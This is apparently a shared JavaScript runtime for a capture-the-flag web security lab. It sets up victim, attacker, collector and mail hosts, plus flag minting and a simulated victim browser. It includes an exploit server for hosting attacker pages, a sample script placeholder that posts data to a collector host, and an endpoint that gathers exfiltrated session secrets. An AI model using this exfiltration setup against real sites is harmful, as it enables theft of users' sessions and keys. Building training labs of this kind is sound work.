'use strict';
/*
 * VLH-CTF — DSLTV shared subclass runtime.
 * Boots one isolated lab behind 4 vhosts (victim / attacker / collector / mail),
 * seeds the user tiers, generates + registers flags, and exposes the ctx API
 * that each subclass's vuln.js uses to mount its vulnerable surface.
 *
 * Binding contract: see /CONTRACT.md (repo root) and dsltv/base/README.md.
 */
const express = require('express');
const Database = require('better-sqlite3');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');

/* ---------------------------------------------------------------- helpers */
const randDigits = (n) => Array.from({ length: n }, () => crypto.randomInt(0, 10)).join('');
const randHex = (n) => crypto.randomBytes(Math.ceil(n / 2)).toString('hex').slice(0, n);
const nowIso = () => new Date().toISOString();
const esc = (s) => String(s == null ? '' : s)
  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;').replace(/'/g, '&#39;');

/* ------------------------------------------------------------------- env */
const SUBCLASS = process.env.SUBCLASS || 'unknown';
const LAB_DOMAIN = process.env.LAB_DOMAIN || 'target.lab';
const LISTEN_PORT = parseInt(process.env.LISTEN_PORT || '8080', 10);
const DATA_DIR = process.env.DATA_DIR || '/data';
const REGISTRY_DIR = process.env.REGISTRY_DIR || '/registry';

fs.mkdirSync(DATA_DIR, { recursive: true });
try { fs.mkdirSync(REGISTRY_DIR, { recursive: true }); } catch (_) { /* read-only fallback below */ }

const registryFile = (() => {
  const p = path.join(REGISTRY_DIR, 'flags.ndjson');
  try { fs.appendFileSync(p, ''); return p; } catch (_) { return path.join(DATA_DIR, 'registry-fallback.ndjson'); }
})();
const registryAppend = (obj) => {
  try { fs.appendFileSync(registryFile, JSON.stringify(obj) + '\n'); } catch (_) { /* best effort */ }
};

/* ------------------------------------------------------------------- db */
const db = new Database(path.join(DATA_DIR, 'lab.db'));
db.pragma('journal_mode = WAL');
db.exec(`
CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT UNIQUE NOT NULL,
  password TEXT NOT NULL,
  role TEXT NOT NULL DEFAULT 'user',
  email TEXT,
  recovery_email TEXT,
  api_key TEXT,
  mfa_secret TEXT,
  oauth_sub TEXT,
  created_at TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS sessions (
  sid TEXT PRIMARY KEY,
  user_id INTEGER NOT NULL,
  auth_method TEXT NOT NULL DEFAULT 'password',
  created_at TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS flags (
  category TEXT NOT NULL,
  sub_name TEXT NOT NULL,
  flag TEXT,
  archetype TEXT NOT NULL,
  event_kind TEXT,
  state TEXT NOT NULL,
  minted_at TEXT,
  PRIMARY KEY (category, sub_name)
);
CREATE TABLE IF NOT EXISTS activity (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ts TEXT NOT NULL,
  identifier TEXT NOT NULL,
  is_authenticated INTEGER NOT NULL,
  data TEXT NOT NULL,
  latency_ms REAL NOT NULL
);
CREATE TABLE IF NOT EXISTS exfil_hits (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ts TEXT NOT NULL,
  origin TEXT, referer TEXT, sec_fetch_site TEXT,
  payload TEXT, ip TEXT
);
CREATE TABLE IF NOT EXISTS mailbox (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ts TEXT NOT NULL,
  to_addr TEXT NOT NULL,
  subject TEXT NOT NULL,
  body TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS attacker_pages (
  name TEXT PRIMARY KEY,
  body TEXT NOT NULL,
  ts TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS attacker_hits (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ts TEXT NOT NULL,
  host TEXT, url TEXT, referer TEXT, origin TEXT
);
CREATE TABLE IF NOT EXISTS kv (key TEXT PRIMARY KEY, value TEXT NOT NULL);
`);

/* ------------------------------------------------------------ seed users
 * Restart-safe: the innocent identity + its session-bound secret persist in the
 * kv table, so a restart with a kept <slug>-data volume adopts boot-1's identity
 * (users table + event-flag derivation stay consistent). Fresh volume → new seed.
 */
const kvGet = (k) => { try { const r = db.prepare('SELECT value FROM kv WHERE key=?').get(k); return r ? r.value : null; } catch (_) { return null; } };
const kvSet = (k, v) => { try { db.prepare('INSERT INTO kv (key,value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value').run(k, String(v)); } catch (_) { /* best effort */ } };

const SEED = (() => {
  const persisted = (() => {
    try { return JSON.parse(kvGet('seed_meta') || 'null'); } catch (_) { return null; }
  })();
  if (persisted && persisted.innocent
      && db.prepare('SELECT 1 FROM users WHERE username = ?').get(persisted.innocent.username)) {
    const row = db.prepare('SELECT * FROM users WHERE username = ?').get(persisted.innocent.username);
    return {
      resumed: true,
      innocent: {
        username: row.username, password: row.password, role: 'innocent',
        email: row.email, recovery_email: row.recovery_email,
        api_key: row.api_key || persisted.innocent.api_key,
      },
      admin: { username: 'admin', password: db.prepare('SELECT password FROM users WHERE username=?').get('admin')?.password || randHex(16) },
      testers: [
        { username: '0xnhsec', password: 'vlh-tester-01', role: 'tester', email: `0xnhsec@${LAB_DOMAIN}`, api_key: randHex(32) },
        { username: 'Noshiro', password: 'vlh-tester-02', role: 'tester', email: `noshiro@${LAB_DOMAIN}`, api_key: randHex(32) },
      ],
    };
  }
  const innocentName = 'usr_' + randHex(4);
  const innocent = {
    username: innocentName,
    password: randHex(16),
    role: 'innocent',
    email: `${innocentName}@${LAB_DOMAIN}`,
    recovery_email: `${innocentName}+recovery@${LAB_DOMAIN}`,
    api_key: randHex(32),
  };
  const admin = { username: 'admin', password: randHex(16), role: 'admin', email: `admin@${LAB_DOMAIN}`, api_key: randHex(32) };
  const testers = [
    { username: '0xnhsec', password: 'vlh-tester-01', role: 'tester', email: `0xnhsec@${LAB_DOMAIN}`, api_key: randHex(32) },
    { username: 'Noshiro', password: 'vlh-tester-02', role: 'tester', email: `noshiro@${LAB_DOMAIN}`, api_key: randHex(32) },
  ];
  return { resumed: false, innocent, admin, testers };
})();
kvSet('seed_meta', JSON.stringify({ innocent: { username: SEED.innocent.username, api_key: SEED.innocent.api_key } }));

const seedUsers = db.transaction(() => {
  const ins = db.prepare(`INSERT INTO users (username, password, role, email, recovery_email, api_key, created_at)
                          VALUES (@username, @password, @role, @email, @recovery_email, @api_key, @created_at)`);
  const mk = (u, extraRole) => ins.run({ created_at: nowIso(), recovery_email: null, api_key: null, ...u, role: extraRole || u.role });
  mk(SEED.innocent); mk(SEED.admin);
  for (const t of SEED.testers) mk(t);
});
if (!db.prepare('SELECT COUNT(*) c FROM users').get().c) seedUsers();

/* grading-only seed dump inside the container (never player-accessible) */
try {
  fs.writeFileSync(path.join(DATA_DIR, 'seed.json'), JSON.stringify({
    subclass: SUBCLASS, generated_at: nowIso(),
    innocent: { username: SEED.innocent.username, password: SEED.innocent.password, api_key: SEED.innocent.api_key },
    admin: { username: 'admin', password: SEED.admin.password },
  }, null, 2));
} catch (_) { /* best effort */ }

/* ------------------------------------------------------------ flags core */
const flagFmt = (category, subName, digits) => `DSLTV{${category}-${subName}-${digits}}`;
const eventNumeric = (category, subName) => {
  const h = crypto.createHash('sha256').update(`${SEED.innocent.api_key}:${category}:${subName}`).digest('hex');
  return String(parseInt(h.slice(0, 12), 16) % 1000000000).padStart(9, '0');
};

const usersApi = {
  byUsername: (u) => db.prepare('SELECT * FROM users WHERE username = ?').get(u),
  byId: (id) => db.prepare('SELECT * FROM users WHERE id = ?').get(id),
  all: () => db.prepare('SELECT * FROM users').all(),
  innocent: () => usersApi.byUsername(SEED.innocent.username),
  admin: () => usersApi.byUsername('admin'),
  verify: (username, password) => {
    const u = usersApi.byUsername(String(username || ''));
    return u && u.password === String(password || '') ? u : null;
  },
};

const flagsApi = {
  /* held = pre-generated at boot (resource-resident / identity-gated / location-locked / stage-gated) */
  held: (category, subName) => db.prepare('SELECT flag FROM flags WHERE category=? AND sub_name=?').get(category, subName)?.flag || null,
  /* event-verified: deterministic per boot, minted only via /verify dual-check */
  eventFlag: (category, subName) => flagFmt(category, subName, eventNumeric(category, subName)),
  minted: (category, subName) => db.prepare("SELECT flag FROM flags WHERE category=? AND sub_name=? AND state='minted'").get(category, subName)?.flag || null,
  mintEvent: (category, subName) => {
    const flag = flagsApi.eventFlag(category, subName);
    db.prepare("UPDATE flags SET state='minted', flag=?, minted_at=? WHERE category=? AND sub_name=?").run(flag, nowIso(), category, subName);
    registryAppend({ flag, category, unit: `dsltv-${SUBCLASS}`, archetype: 'event-verified', minted_at: nowIso(), note: 'minted' });
    return flag;
  },
};

/* --------------------------------------------------------------- session */
const parseCookies = (hdr) => {
  const out = {};
  String(hdr || '').split(';').forEach((p) => {
    const i = p.indexOf('=');
    if (i > 0) out[p.slice(0, i).trim()] = decodeURIComponent(p.slice(i + 1).trim());
  });
  return out;
};

const sessionApi = {
  create: (user, authMethod) => {
    const sid = randHex(32);
    db.prepare('INSERT INTO sessions (sid, user_id, auth_method, created_at) VALUES (?,?,?,?)')
      .run(sid, user.id, authMethod || 'password', nowIso());
    return sid;
  },
  get: (req) => {
    const sid = parseCookies(req.headers.cookie).sid;
    if (!sid) return null;
    const s = db.prepare('SELECT * FROM sessions WHERE sid = ?').get(sid);
    if (!s) return null;
    const u = usersApi.byId(s.user_id);
    return u ? { user: u, session: s } : null;
  },
  destroy: (req) => {
    const sid = parseCookies(req.headers.cookie).sid;
    if (sid) db.prepare('DELETE FROM sessions WHERE sid = ?').run(sid);
  },
};

/* ----------------------------------------------------------- html layout */
const LAYOUT_CSS = `
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body { font-family: ui-monospace, 'JetBrains Mono', Menlo, Consolas, monospace;
         background:#0a0f0a; color:#c7f0c7; margin:0; padding:0 0 4rem; }
  a { color:#4ade80; }
  .wrap { max-width: 880px; margin: 0 auto; padding: 1.25rem; }
  header { border-bottom:1px solid #1c3a1c; padding:.9rem 1.25rem; background:#0d140d;
           display:flex; gap:1rem; align-items:center; flex-wrap:wrap; }
  header .brand { color:#4ade80; font-weight:700; letter-spacing:.08em; }
  header nav a { margin-right:.9rem; text-decoration:none; color:#86efac; font-size:.85rem; }
  main.wrap h1 { color:#4ade80; font-size:1.25rem; }
  .card { border:1px solid #1c3a1c; background:#0d140d; border-radius:6px; padding:1rem; margin:.75rem 0; }
  table { border-collapse:collapse; width:100%; font-size:.85rem; }
  th,td { border:1px solid #1c3a1c; padding:.4rem .55rem; text-align:left; vertical-align:top; }
  th { color:#4ade80; }
  input,textarea,select,button { font:inherit; background:#0f1a0f; color:#c7f0c7;
        border:1px solid #2a5a2a; border-radius:4px; padding:.45rem .6rem; }
  button { cursor:pointer; border-color:#4ade80; color:#4ade80; }
  button:hover { background:#142a14; }
  .muted { color:#5c8a5c; font-size:.8rem; }
  .flag { color:#facc15; font-weight:700; letter-spacing:.05em; }
  pre { background:#0f1a0f; border:1px solid #1c3a1c; padding:.75rem; overflow:auto; border-radius:6px; }
`;

function render(title, bodyHtml, opts) {
  opts = opts || {};
  return `<!doctype html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>${esc(title)} — DSLTV ${esc(SUBCLASS)}</title>
<style>${LAYOUT_CSS}</style>
</head><body>
<header>
  <span class="brand">DSLTV{${esc(SUBCLASS)}}</span>
  <nav>
    <a href="/">home</a>
    <a href="/me">account</a>
    <a href="http://attacker.${esc(LAB_DOMAIN)}:8119/">exploit server</a>
    <a href="http://collector.${esc(LAB_DOMAIN)}:8119/verify">verifier</a>
    <a href="http://mail.${esc(LAB_DOMAIN)}:8119/">mail</a>
  </nav>
  <span class="muted">${esc(opts.tagline || 'single-bug-class lab — VLH-CTF')}</span>
</header>
<main class="wrap">${bodyHtml}</main>
</body></html>`;
}

/* ------------------------------------------------------------- app setup */
const app = express();
app.disable('x-powered-by');
app.use(express.json({ limit: '256kb', strict: false }));
app.use(express.urlencoded({ extended: false, limit: '256kb' }));
app.use(express.text({ limit: '256kb', type: ['text/plain', 'text/html'] }));
app.use((req, res, next) => { // raw body capture for endpoints that need it
  req.rawBody = '';
  const chunks = [];
  req.on('data', (c) => { if (chunks.length < 64) chunks.push(c); });
  req.on('end', () => { req.rawBody = Buffer.concat(chunks).toString('utf8'); });
  next();
});

/* activity logging (all vhosts) — FR-8 feed */
app.use((req, res, next) => {
  const start = process.hrtime.bigint();
  res.on('finish', () => {
    try {
      const auth = sessionApi.get(req);
      const ip = req.socket.remoteAddress || '-';
      const identifier = auth ? auth.user.username : `${ip}/${(parseCookies(req.headers.cookie).sid || 'anon').slice(0, 8)}`;
      const latency = Number(process.hrtime.bigint() - start) / 1e6;
      db.prepare('INSERT INTO activity (ts, identifier, is_authenticated, data, latency_ms) VALUES (?,?,?,?,?)')
        .run(nowIso(), identifier, auth ? 1 : 0, `${req.method} ${req.originalUrl}`, Math.round(latency * 100) / 100);
    } catch (_) { /* never break the request */ }
  });
  next();
});

/*
 * Vhost routing. Any *.target.lab host that is not victim/attacker/collector/mail
 * is treated as ATTACKER-controlled space (models attacker-owned subdomains /
 * wildcard DNS). This is what makes WeakOriginRegex, SubdomainTrust and
 * RedirectUriBypass genuinely playable inside one lab domain.
 */
const vhostOf = (req) => {
  const host = String(req.headers.host || '').split(':')[0].toLowerCase();
  if (host === `attacker.${LAB_DOMAIN}`) return 'attacker';
  if (host === `collector.${LAB_DOMAIN}`) return 'collector';
  if (host === `mail.${LAB_DOMAIN}`) return 'mail';
  if (host === `victim.${LAB_DOMAIN}` || host === 'localhost' || host === ''
      || /^(?:\d{1,3}\.){3}\d{1,3}$/.test(host) || host.endsWith('localhost')) return 'app';
  if (host.endsWith(`.${LAB_DOMAIN}`)) return 'attacker';
  return 'app';
};

const appRouter = express.Router();
const attackerRouter = express.Router();
const collectorRouter = express.Router();
const mailRouter = express.Router();
app.use((req, res, next) => {
  switch (vhostOf(req)) {
    case 'attacker': attackerRouter(req, res, next); break;
    case 'collector': collectorRouter(req, res, next); break;
    case 'mail': mailRouter(req, res, next); break;
    default: appRouter(req, res, next);
  }
});

/* --------------------------------------------------------- base ctx API */
const stateApi = {
  get: (k) => { const r = db.prepare('SELECT value FROM kv WHERE key=?').get(k); try { return r ? JSON.parse(r.value) : undefined; } catch (_) { return r ? r.value : undefined; } },
  set: (k, v) => db.prepare('INSERT INTO kv (key,value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value').run(k, JSON.stringify(v)),
};

const mailApi = {
  send: ({ to, subject, body }) => {
    const r = db.prepare('INSERT INTO mailbox (ts, to_addr, subject, body) VALUES (?,?,?,?)').run(nowIso(), to, subject, body);
    return r.lastInsertRowid;
  },
  latest: () => db.prepare('SELECT * FROM mailbox ORDER BY id DESC LIMIT 50').all(),
  byId: (id) => db.prepare('SELECT * FROM mailbox WHERE id = ?').get(id),
};

const ctx = {
  meta: null, // filled after loading vuln.js
  db, express, jwt, crypto,
  labDomain: LAB_DOMAIN,
  subclass: SUBCLASS,
  listenPort: LISTEN_PORT,
  urls: {
    victim: `http://victim.${LAB_DOMAIN}:8119`,
    attacker: `http://attacker.${LAB_DOMAIN}:8119`,
    collector: `http://collector.${LAB_DOMAIN}:8119`,
    mail: `http://mail.${LAB_DOMAIN}:8119`,
  },
  /* routers — subclass mounts its vulnerable surface on ctx.app ONLY */
  app: appRouter, attacker: attackerRouter, collector: collectorRouter, mail: mailRouter,
  /* data + helpers */
  users: usersApi,
  flags: flagsApi,
  session: sessionApi,
  state: stateApi,
  mail: mailApi,
  render,
  esc,
  randHex, randDigits, nowIso,
  /* login helpers with overridable cookie attributes (SameSiteNone subclass etc.) */
  login(res, user, opts) {
    opts = opts || {};
    const sid = sessionApi.create(user, opts.authMethod || 'password');
    const cookie = [`sid=${sid}`, 'Path=/', ...(opts.cookie || [])].join('; ');
    res.setHeader('Set-Cookie', cookie);
    return sid;
  },
  logout(req, res) { sessionApi.destroy(req); res.setHeader('Set-Cookie', 'sid=; Path=/; Max-Age=0'); },
  requireAuth(req) { return sessionApi.get(req); },
  /* default pages the subclass may keep or override by registering earlier? No —
     subclass routes are mounted BEFORE these; these are fallbacks. */
};

/* ------------------------------------------- base routes (victim vhost) */
appRouter.get('/healthz', (req, res) => res.json({ ok: true, subclass: SUBCLASS }));

appRouter.get('/me', (req, res) => {
  const auth = sessionApi.get(req);
  if (!auth) return res.status(401).type('html').send(render('Account', '<p>Not logged in. <a href="/">Log in</a></p>'));
  const u = auth.user;
  res.type('html').send(render('Account', `
    <h1>Account — ${esc(u.username)}</h1>
    <table>
      <tr><th>username</th><td>${esc(u.username)}</td></tr>
      <tr><th>role</th><td>${esc(u.role)}</td></tr>
      <tr><th>email</th><td>${esc(u.email || '')}</td></tr>
      <tr><th>recovery email</th><td>${esc(u.recovery_email || '')}</td></tr>
      <tr><th>api key</th><td><code>${esc(u.api_key || '')}</code></td></tr>
      <tr><th>auth method</th><td>${esc(auth.session.auth_method)}</td></tr>
    </table>
    <p class="muted">Session provenance <code>auth_method=${esc(auth.session.auth_method)}</code> — required field (PRD §8).</p>`));
});

/* ------------------------------------------ attacker vhost (exploit srv) */
attackerRouter.use((req, res, next) => { // record every hit (Referer/origin leak capture)
  try {
    db.prepare('INSERT INTO attacker_hits (ts, host, url, referer, origin) VALUES (?,?,?,?,?)')
      .run(nowIso(), String(req.headers.host || ''), req.originalUrl,
        req.headers.referer || '', req.headers.origin || '');
  } catch (_) { /* best effort */ }
  next();
});
attackerRouter.get('/leaks', (req, res) => {
  const hits = db.prepare('SELECT * FROM attacker_hits ORDER BY id DESC LIMIT 100').all();
  res.type('html').send(render('Captured hits', `
    <h1>Attacker-captured hits</h1>
    <p class="muted">Every request this server received, including Referer/Origin — your malicious assets' viewpoint.</p>
    <table><tr><th>time</th><th>host</th><th>url</th><th>referer</th><th>origin</th></tr>
    ${hits.map((h) => `<tr><td>${esc(h.ts)}</td><td>${esc(h.host)}</td><td>${esc(h.url)}</td><td>${esc(h.referer)}</td><td>${esc(h.origin)}</td></tr>`).join('') || '<tr><td colspan="5" class="muted">no hits yet</td></tr>'}
    </table>`));
});
attackerRouter.get('/', (req, res) => {
  const pages = db.prepare('SELECT name, ts FROM attacker_pages ORDER BY name').all();
  res.type('html').send(render('Exploit server', `
    <h1>Exploit server</h1>
    <p class="muted">Store exploit pages, then deliver <code>http://attacker.${esc(LAB_DOMAIN)}:8119/pages/&lt;name&gt;</code> to the victim browser.</p>
    <form method="POST" action="/pages/exploit.html">
      <p><input name="name" value="exploit.html" size="24" required> <button>store page</button></p>
      <p><textarea name="body" rows="12" cols="90" placeholder="&lt;script&gt;fetch('http://collector.${esc(LAB_DOMAIN)}:8119/collect',{method:'POST',body:...})&lt;/script&gt;"></textarea></p>
    </form>
    <table><tr><th>page</th><th>stored at</th><th>url</th></tr>
    ${pages.map((p) => `<tr><td>${esc(p.name)}</td><td>${esc(p.ts)}</td><td><a href="/pages/${esc(p.name)}">/pages/${esc(p.name)}</a></td></tr>`).join('')}
    </table>`));
});
const storePage = (req, res) => {
  const name = String(req.params.name || '').replace(/[^a-zA-Z0-9._-]/g, '_');
  const body = (req.body && (req.body.body || req.body)) || req.rawBody || '';
  db.prepare('INSERT INTO attacker_pages (name, body, ts) VALUES (?,?,?) ON CONFLICT(name) DO UPDATE SET body=excluded.body, ts=excluded.ts')
    .run(name, typeof body === 'string' ? body : JSON.stringify(body), nowIso());
  res.send({ stored: true, url: `/pages/${name}` });
};
attackerRouter.put('/pages/:name', storePage);
attackerRouter.post('/pages/:name', storePage);
attackerRouter.get('/pages/:name', (req, res) => {
  const p = db.prepare('SELECT body FROM attacker_pages WHERE name = ?').get(String(req.params.name).replace(/[^a-zA-Z0-9._-]/g, '_'));
  if (!p) return res.status(404).send('no such page');
  res.type('html').send(p.body);
});

/* ------------------------------------------------ collector (verifier) */
collectorRouter.post('/collect', (req, res) => {
  const payload = (req.body && (req.body.payload || req.body)) || req.rawBody || '';
  db.prepare('INSERT INTO exfil_hits (ts, origin, referer, sec_fetch_site, payload, ip) VALUES (?,?,?,?,?,?)')
    .run(nowIso(), req.headers.origin || '', req.headers.referer || '', req.headers['sec-fetch-site'] || '',
      typeof payload === 'string' ? payload.slice(0, 4096) : JSON.stringify(payload).slice(0, 4096),
      req.socket.remoteAddress || '-');
  res.json({ collected: true });
});

collectorRouter.get('/verify', (req, res) => {
  const out = { verified: false, reason: '', flag: null, subclass: SUBCLASS, checked_at: nowIso() };
  const evRows = db.prepare("SELECT * FROM flags WHERE archetype='event-verified' AND state != 'minted'").all();
  if (!evRows.length) {
    const already = db.prepare("SELECT * FROM flags WHERE archetype='event-verified' AND state='minted'").all();
    if (already.length) { out.verified = true; out.flag = already[0].flag; out.reason = 'already minted'; return res.json(out); }
    return res.json(out);
  }
  const f = evRows[0];
  if (f.event_kind === 'csrf') {
    /* shared CSRF checker: innocent-row state change (recovery_email changed post-seed) */
    const innocent = usersApi.innocent();
    if (innocent && innocent.recovery_email !== SEED.innocent.recovery_email) {
      const flag = flagsApi.mintEvent(f.category, f.sub_name);
      out.verified = true; out.flag = flag; out.reason = 'innocent row state change observed';
    } else {
      out.reason = 'no innocent-row state change observed yet';
    }
    return res.json(out);
  }
  /* CORS dual-check: cross-site context + payload bound to innocent session secret */
  const hit = db.prepare('SELECT * FROM exfil_hits ORDER BY id DESC LIMIT 1').get();
  if (!hit) { out.reason = 'no exfil hit received'; return res.json(out); }
  const innocent = usersApi.innocent();
  const crossSite = String(hit.origin).includes(`attacker.${LAB_DOMAIN}`)
    || String(hit.referer).includes(`attacker.${LAB_DOMAIN}`)
    || hit.sec_fetch_site === 'cross-site';
  const secretMatch = String(hit.payload).includes(innocent.api_key);
  if (crossSite && secretMatch) {
    const flag = flagsApi.mintEvent(f.category, f.sub_name);
    out.verified = true; out.flag = flag;
    out.reason = 'dual check passed: cross-site context + session-bound secret match';
  } else {
    out.reason = `dual check failed (cross-site=${crossSite}, secret-match=${secretMatch})`;
  }
  res.json(out);
});

collectorRouter.get('/internal/activity', (req, res) => {
  const rows = db.prepare('SELECT ts, identifier, is_authenticated, data, latency_ms FROM activity ORDER BY id DESC LIMIT 5000').all();
  res.type('application/x-ndjson').send(rows.map((r) => JSON.stringify({
    ts: r.ts, identifier: r.identifier, is_authenticated: !!r.is_authenticated,
    data: r.data, latency: r.latency_ms, unit: `dsltv-${SUBCLASS}`,
  })).join('\n') + '\n');
});

/* ---------------------------------------------------- victim bot (solo play)
 * Server-side victim-browser simulation (PRD §3: attacker + victim both played by
 * the operator). Logs in as the innocent user, fetches a URL with their session,
 * follows redirects with a cookie jar, and — when an attacker origin is supplied —
 * models the SOP-permitted cross-site read by piping the response to /collect
 * (feeding the dual-check verifier). Documented limitation: not a real browser;
 * SameSite/origin semantics are modelled by the supplied headers.
 */
const http = require('http');
function botRequest(target, opts) {
  return new Promise((resolve, reject) => {
    const u = new URL(target);
    const req = http.request({
      host: u.hostname, port: u.port || 80, path: u.pathname + u.search,
      method: opts.method || 'GET', headers: opts.headers || {},
    }, (res) => {
      const chunks = [];
      res.on('data', (c) => { if (chunks.length < 32) chunks.push(c); });
      res.on('end', () => resolve({
        status: res.statusCode,
        headers: res.headers,
        location: res.headers.location || null,
        setCookies: res.headers['set-cookie'] || [],
        body: Buffer.concat(chunks).toString('utf8'),
      }));
    });
    req.on('error', reject);
    if (opts.body) req.write(opts.body);
    req.end();
  });
}
function labUrlToLoopback(urlStr) {
  /* victim.target.lab:8119 etc resolve to the sidecar from the host, but inside
     this container we reach ourselves on LISTEN_PORT with the Host header set. */
  try {
    const u = new URL(urlStr);
    if (u.hostname.endsWith(`.${LAB_DOMAIN}`)) {
      const hostHeader = `${u.hostname}:${u.port || 8119}`;
      return { url: `http://127.0.0.1:${LISTEN_PORT}${u.pathname}${u.search}`, hostHeader };
    }
  } catch (_) { /* ignore */ }
  return { url: urlStr, hostHeader: null };
}
collectorRouter.post('/victim', async (req, res) => {
  const b = req.body || {};
  if (!b.url) return res.status(400).json({ error: 'url required' });
  const innocent = usersApi.innocent();
  const jar = new Map();
  const out = { hops: [], finalUrl: null, status: null, excerpt: '' };
  try {
    /* optional SSO pre-login: subclass exposes GET /__sso that logs the innocent in */
    if (b.sso) {
      const { url, hostHeader } = labUrlToLoopback(`${ctx.urls.victim}/__sso`);
      const r = await botRequest(url, { headers: { host: hostHeader || `victim.${LAB_DOMAIN}:${8119}` } });
      (r.setCookies || []).forEach((c) => { const m = /([^=]+)=([^;]*)/.exec(c); if (m) jar.set(m[1], m[2]); });
    }
    if (b.cookies) for (const [k, v] of Object.entries(b.cookies)) jar.set(k, v);
    if (!b.cookies && !b.sso) {
      /* fresh innocent session by default */
      const sid = sessionApi.create(innocent, 'password');
      jar.set('sid', sid);
    }
    let current = b.url;
    for (let hop = 0; hop < 8; hop++) {
      const { url, hostHeader } = labUrlToLoopback(current);
      const headers = {};
      if (hostHeader) headers.host = hostHeader;
      if (jar.size) headers.cookie = [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
      if (b.origin) headers.origin = String(b.origin);
      if (b.referer) headers.referer = String(b.referer);
      if (b.body !== undefined && typeof b.body === 'object') headers['content-type'] = 'application/json';
      const r = await botRequest(url, {
        method: (hop === 0 && b.method) ? String(b.method).toUpperCase() : 'GET',
        headers,
        body: (hop === 0 && b.body !== undefined)
          ? (typeof b.body === 'object' ? JSON.stringify(b.body) : String(b.body)) : undefined,
      });
      (r.setCookies || []).forEach((c) => { const m = /([^=]+)=([^;]*)/.exec(c); if (m) jar.set(m[1], m[2]); });
      out.hops.push({ url: current, status: r.status, location: r.location });
      if (r.location && r.status >= 300 && r.status < 400) {
        let loc = r.location;
        if (loc.startsWith('/')) { const base = new URL(current); loc = `${base.origin}${loc}`; }
        out.finalUrl = loc; current = loc; continue;
      }
      out.status = r.status; out.finalUrl = current;
      out.excerpt = r.body.slice(0, 1200);
      /* model the SOP-permitted read the vulnerable ACAO would grant the attacker page:
         pipe the cross-site response body to the exfil verifier with origin context */
      if (b.origin) {
        db.prepare('INSERT INTO exfil_hits (ts, origin, referer, sec_fetch_site, payload, ip) VALUES (?,?,?,?,?,?)')
          .run(nowIso(), String(b.origin || ''), String(b.referer || ''), 'cross-site',
            r.body.slice(0, 4096), req.socket.remoteAddress || '-');
      }
      break;
    }
    res.json(out);
  } catch (e) {
    res.status(502).json({ error: String(e), ...out });
  }
});

/* ------------------------------------------------------------ mail vhost */
mailRouter.post('/internal/mail', (req, res) => {
  const { to, subject, body } = req.body || {};
  if (!to || !subject) return res.status(400).json({ error: 'to, subject, body required' });
  res.json({ id: mailApi.send({ to, subject, body: body || '' }) });
});
mailRouter.get('/', (req, res) => {
  const items = mailApi.latest();
  res.type('html').send(render('Mail', `
    <h1>Mailbox</h1>
    <table><tr><th>id</th><th>time</th><th>to</th><th>subject</th><th>view</th></tr>
    ${items.map((m) => `<tr><td>${m.id}</td><td>${esc(m.ts)}</td><td>${esc(m.to_addr)}</td><td>${esc(m.subject)}</td><td><a href="/mail/${m.id}">open</a></td></tr>`).join('') || '<tr><td colspan="5" class="muted">empty</td></tr>'}
    </table>`));
});
mailRouter.get('/mail/:id', (req, res) => {
  const m = mailApi.byId(Number(req.params.id));
  if (!m) return res.status(404).json({ error: 'no such mail' });
  const links = String(m.body).match(/https?:\/\/[^\s"'<>)]+/g) || [];
  res.json({ id: m.id, ts: m.ts, to: m.to_addr, subject: m.subject, body: m.body, links });
});

/* ----------------------------------------------------------------- boot */
function bootFlags(meta) {
  const list = (meta.flags && meta.flags.length) ? meta.flags
    : [{ category: meta.category, subName: meta.subName, archetype: meta.archetype, eventKind: meta.eventKind }];
  const upsert = db.prepare(`INSERT INTO flags (category, sub_name, flag, archetype, event_kind, state, minted_at)
                             VALUES (@category, @sub_name, @flag, @archetype, @event_kind, @state, @minted_at)
                             ON CONFLICT(category, sub_name) DO UPDATE SET flag=excluded.flag, state=excluded.state, archetype=excluded.archetype, event_kind=excluded.event_kind, minted_at=excluded.minted_at`);
  for (const f of list) {
    const eventVerified = f.archetype === 'event-verified';
    const flag = eventVerified ? null : flagFmt(f.category, f.subName, randDigits(9));
    upsert.run({
      category: f.category, sub_name: f.subName, flag,
      archetype: f.archetype, event_kind: f.eventKind || (f.category === 'CSRF' ? 'csrf' : 'cors'),
      state: eventVerified ? 'unminted' : 'held', minted_at: eventVerified ? null : nowIso(),
    });
    registryAppend({
      flag: flag || null, category: f.category, unit: `dsltv-${SUBCLASS}`,
      archetype: f.archetype, minted_at: nowIso(),
      note: eventVerified ? 'event-verified, unminted at boot' : 'held',
    });
  }
}

async function main() {
  let vuln;
  try {
    vuln = require('/app/vuln.js');
  } catch (e) {
    console.error('[base] cannot load /app/vuln.js:', e.message);
    process.exit(1);
  }
  const meta = {
    slug: SUBCLASS,
    category: vuln.meta.category, subName: vuln.meta.subName,
    archetype: vuln.meta.archetype, eventKind: vuln.meta.eventKind,
    difficulty: vuln.meta.difficulty, description: vuln.meta.description,
    ...vuln.meta,
  };
  ctx.meta = meta;
  bootFlags(meta);

  /* default landing (subclass usually overrides by registering GET / first —
     express matches in registration order, so subclass routes win). */
  appRouter.get('/', (req, res) => {
    res.type('html').send(render(meta.subName, `
      <h1>${esc(meta.category)} — ${esc(meta.subName)}</h1>
      <div class="card"><p>${esc(meta.description || 'single-bug-class lab')}</p>
      <p class="muted">archetype: ${esc(meta.archetype)} · difficulty: ${esc(meta.difficulty || 'n/a')}</p></div>
      <p class="muted">The subclass did not register a landing page. See the player guide.</p>`));
  });

  if (typeof vuln.setup === 'function') {
    try { await vuln.setup(ctx); } catch (e) {
      console.error('[base] subclass setup failed:', e);
      process.exit(1);
    }
  }

